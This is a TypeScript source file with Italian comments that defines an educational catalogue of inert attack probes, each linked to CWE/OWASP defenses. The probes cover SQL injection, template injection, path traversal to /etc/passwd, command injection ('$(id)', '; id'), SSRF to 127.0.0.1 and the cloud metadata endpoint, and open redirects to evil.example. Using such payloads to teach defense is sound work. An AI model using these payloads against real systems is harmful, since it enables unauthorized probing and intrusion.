import type { DefenseSubject } from './types.ts';

/**
 * Payload pack didattici (Fase 4). Ogni famiglia d'attacco porta payload INERTI e
 * non distruttivi — sonde che mostrano il meccanismo, non exploit "armati": niente
 * DROP/DELETE, niente rm, niente shell reverse. Comandi solo benigni (id/whoami),
 * host di esempio/riservati, lettura di /etc/passwd come classica sonda testuale.
 * Ogni pack è accompagnato dalla sua difesa (pannello Difesa) e da CWE/OWASP.
 *
 * I payload sono SEMPRE mostrati come testo, mai eseguiti. Non provano una vulnerabilità.
 */
export interface PayloadPack extends DefenseSubject {
  payloads: string[];
}

export const PAYLOAD_PACKS: readonly PayloadPack[] = [
  {
    id: 'sqli',
    i18nBase: 'pack.sqli',
    defense: { cwe: 'CWE-89', owasp: 'A03:2021' },
    payloads: [
      "' OR 1=1--",
      "' OR '1'='1",
      "admin'--",
      "' UNION SELECT NULL,NULL--",
      '1) OR (1=1',
    ],
  },
  {
    id: 'ssti',
    i18nBase: 'pack.ssti',
    defense: { cwe: 'CWE-94', owasp: 'A03:2021' },
    payloads: ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>', "{{7*'7'}}"],
  },
  {
    id: 'lfi',
    i18nBase: 'pack.lfi',
    defense: { cwe: 'CWE-22', owasp: 'A01:2021' },
    payloads: [
      '../../../../etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '....//....//etc/passwd',
      '/var/www/../../etc/passwd',
    ],
  },
  {
    id: 'cmd-injection',
    i18nBase: 'pack.cmd-injection',
    defense: { cwe: 'CWE-78', owasp: 'A03:2021' },
    payloads: ['; id', '| id', '$(id)', '`id`', '&& whoami'],
  },
  {
    id: 'ssrf',
    i18nBase: 'pack.ssrf',
    defense: { cwe: 'CWE-918', owasp: 'A10:2021' },
    payloads: [
      'http://127.0.0.1:80/',
      'http://169.254.169.254/latest/meta-data/',
      'http://localhost/admin',
      'file:///etc/passwd',
    ],
  },
  {
    id: 'open-redirect',
    i18nBase: 'pack.open-redirect',
    defense: { cwe: 'CWE-601', owasp: 'A01:2021' },
    payloads: [
      '//evil.example',
      'https://evil.example',
      '/\\evil.example',
      'https:evil.example',
    ],
  },
];

export const PACK_BY_ID: ReadonlyMap<string, PayloadPack> = new Map(
  PAYLOAD_PACKS.map((pack) => [pack.id, pack]),
);
